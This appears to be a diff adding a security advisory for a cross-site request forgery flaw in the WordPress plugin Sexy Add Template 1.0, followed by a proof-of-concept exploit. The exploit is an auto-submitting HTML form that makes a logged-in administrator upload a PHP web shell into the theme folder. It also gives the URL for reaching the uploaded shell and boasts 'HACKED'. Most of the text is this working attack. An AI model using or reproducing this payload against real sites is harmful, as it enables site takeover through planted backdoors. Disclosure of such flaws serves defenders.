@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/55666/info
+
+The Sexy Add Template plugin for WordPress is prone to a cross-site request-forgery vulnerability because the application fails to properly validate HTTP requests.
+
+Exploiting this issue may allow a remote attacker to perform certain actions in the context of an authorized user's session and gain unauthorized access to the affected application; other attacks are also possible.
+
+Sexy Add Template 1.0 is vulnerable; other versions may also be affected. 
+
+#################################################################################
+ #
+ # [ Information Details ]
+ # - Wordpress Plugin Sexy Add Template:
+ # Attacker allow CSRF Upload Shell.
+ # http://localhost/wp-admin/themes.php?page=AM-sexy-handle <--- Vuln CSRF, not require verification CODE "wpnonce".
+ #
+ # <html>
+ # <head>
+ # <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ # <title>Wordpress Plugin Sexy Add Template - CSRF Upload Shell Vulnerability</title>
+ # </head>
+ # <body onload="document.form0.submit();">
+ # <form method="POST" name="form0" action="http://localhost/wp-admin/themes.php?page=AM-sexy-handle" method="post" enctype="multipart/form-data" >
+ # <input type="hidden" name="newfile" value="yes" /> 
+ # <input type="hidden" type="text" value="shell.php" name="AM_filename">
+ # <textarea type="hidden" name="AM_file_content">
+ # [ Your Script Backdoor/Shell ]
+ # &lt;/textarea&gt;
+ # </form>
+ # </body>
+ # </html>
+ #
+ # - Access Shell:
+ # http://www.example.com/wp-content/themes/[theme-name]/shell.php <--- HACKED...!!!
+ #
+ # +#################################################################################
